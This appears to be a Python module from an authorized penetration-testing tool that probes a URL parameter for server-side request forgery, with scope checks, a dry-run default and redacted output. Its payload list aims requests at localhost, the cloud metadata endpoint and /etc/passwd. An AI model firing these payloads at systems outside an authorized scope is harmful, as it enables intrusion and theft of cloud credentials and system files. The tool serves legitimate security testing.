"""Capped SSRF probe — benign + internal/metadata markers only (authorized)."""

from __future__ import annotations

import json
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
from typing import Any

from .. import ui
from ..redaction import redact_text
from .base import RunnerResult, require_in_scope

# Non-destructive targets: look for reflected body markers, not exfil.
_PAYLOADS = (
    ("http://127.0.0.1/", ("localhost", "127.0.0.1", "nginx", "apache", "iis")),
    ("http://169.254.169.254/latest/meta-data/", ("ami-id", "instance-id", "local-ipv4", "meta-data")),
    ("http://[::1]/", ("localhost", "::1")),
    ("file:///etc/passwd", ("root:x:",)),
)


def ssrf_probe(
    target_dir: Path,
    url: str,
    *,
    param: str = "url",
    approve: bool = False,
    force: bool = False,
    timeout: float = 10.0,
) -> RunnerResult:
    require_in_scope(target_dir, url, action="ssrf probe", force=force)
    parsed = urllib.parse.urlparse(url if "://" in url else f"https://{url}")
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    plan = {"url": url, "param": param, "payloads": len(_PAYLOADS), "approve": approve}
    ui.code_panel(json.dumps(plan, indent=2), title="ssrf_probe", lexer="json")
    cmd = ["ssrf_probe", url, f"param={param}"]
    if not approve:
        ui.dry_run_banner()
        return RunnerResult(cmd, False, None, json.dumps({"dry_run": True, **plan}), "", "dry-run")

    results: list[dict[str, Any]] = []
    signal = False
    reason = "no SSRF marker"
    for payload, markers in _PAYLOADS:
        qs2 = dict(qs)
        qs2[param] = [payload]
        probe = urllib.parse.urlunparse(
            (
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                "",
                urllib.parse.urlencode({k: v[0] if v else "" for k, v in qs2.items()}),
                "",
            )
        )
        try:
            req = urllib.request.Request(probe, headers={"User-Agent": "hackbot-ssrf-probe"})
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                status = int(getattr(resp, "status", None) or resp.getcode())
                body = resp.read(80_000).decode("utf-8", errors="replace")
        except urllib.error.HTTPError as exc:
            status = int(exc.code)
            body = exc.read(40_000).decode("utf-8", errors="replace") if exc.fp else ""
        except Exception as exc:  # noqa: BLE001
            results.append({"payload": payload, "error": type(exc).__name__})
            continue
        hit = any(m.lower() in body.lower() for m in markers)
        results.append(
            {
                "payload": payload,
                "status": status,
                "marker": hit,
                "preview": redact_text(body[:160]),
            }
        )
        if hit:
            signal = True
            reason = f"SSRF-like marker for payload={payload}"
            break

    payload_out = {
        "ok": True,
        "signal": signal,
        "reason": reason,
        "results": results,
        "param": param,
    }
    return RunnerResult(cmd, True, 0, json.dumps(payload_out), "", "executed")
